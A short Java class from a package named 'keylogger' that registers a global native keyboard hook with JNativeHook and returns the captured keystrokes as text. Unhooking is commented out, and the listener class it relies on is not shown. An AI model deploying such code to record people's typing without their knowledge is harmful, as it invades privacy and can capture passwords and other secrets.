package com.example.project.features.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class KeyLog {

    KeyListener KL = new KeyListener();
    public void start(){
        KL.able();
    }

    public KeyLog(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
        GlobalScreen.addNativeKeyListener(KL);
    }
    public String end(){
        KL.disable();
//        try {
//            GlobalScreen.unregisterNativeHook();
//        } catch (NativeHookException e) {
//            throw new RuntimeException(e);
//        }
        return KL.getText();
    }
}
